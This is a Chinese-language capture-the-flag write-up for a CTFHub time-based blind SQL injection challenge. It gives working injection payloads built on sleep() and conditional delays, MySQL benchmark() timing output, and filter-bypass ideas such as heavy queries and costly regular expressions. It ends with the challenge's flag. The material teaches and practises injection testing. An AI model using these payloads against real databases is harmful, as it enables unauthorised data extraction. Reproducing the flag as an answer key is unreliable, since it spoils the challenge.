# CTFHUB_时间盲注

## 题目内容

时间盲注

## WriteUp
sleep(5)以下看一下有没有延时

```
1 and sleep(5)
```

然后和bool一样，如果猜解条件对了，就延迟5秒

使用以下语句猜测数据库名长度

```
1 and if(length(database())>=4,sleep(5),1)
```

>if(条件,条件为真,条件为假)类似于c语言的三目运算符
>
>可以用`benchmark`，`sleep`等造成延时效果的函数。
>
>如果`benkchmark`和`sleep`关键字被过滤了，可以让两个非常大的数据表做[笛卡尔积 (opens new window)](https://blog.csdn.net/qq_32763643/article/details/79187931)产生大量的计算从而产生时间延迟；例如使用[`heavy query` (opens new window)](https://www.anquanke.com/post/id/104319)进行延时注入
>
>或者利用复杂的正则表达式去匹配一个超长字符串来产生时间延迟。
>
>## 1.benchmark()
>
>benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式
>
>```
>mysql> select BENCHMARK(10000,md5('a'));
>+---------------------------+
>| BENCHMARK(10000,md5('a')) |
>+---------------------------+
>|                         0 |
>+---------------------------+
>1 row in set (0.00 sec)
>
>mysql> select BENCHMARK(1000000,md5('a'));
>+-----------------------------+
>| BENCHMARK(1000000,md5('a')) |
>+-----------------------------+
>|                           0 |
>+-----------------------------+
>1 row in set (0.33 sec)
>
>mysql> select BENCHMARK(10000000,md5('a'));
>+------------------------------+
>| BENCHMARK(10000000,md5('a')) |
>+------------------------------+
>|                            0 |
>+------------------------------+
>1 row in set (2.93 sec)
>```

猜解原理同理，建议使用自动化工具或者自编写脚本

```
ctfhub{53dd1c65959430e7e77181ee}
```

